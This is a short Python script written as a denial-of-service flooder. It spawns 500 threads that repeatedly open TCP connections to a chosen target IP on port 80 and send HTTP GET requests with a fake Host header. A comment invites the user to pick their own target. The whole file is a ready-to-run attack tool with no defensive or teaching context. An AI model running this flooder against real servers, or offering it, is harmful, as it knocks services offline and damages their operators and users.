import socket
import threading

target = '18.2.1.12' #Default gateway, choose your own
fake_ip = '182.21.20.32'
port = 80


attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('utf-8'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('utf-8'), (target, port))
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()



for i in range(500):
    t = threading.Thread(target=attack)
    t.start()
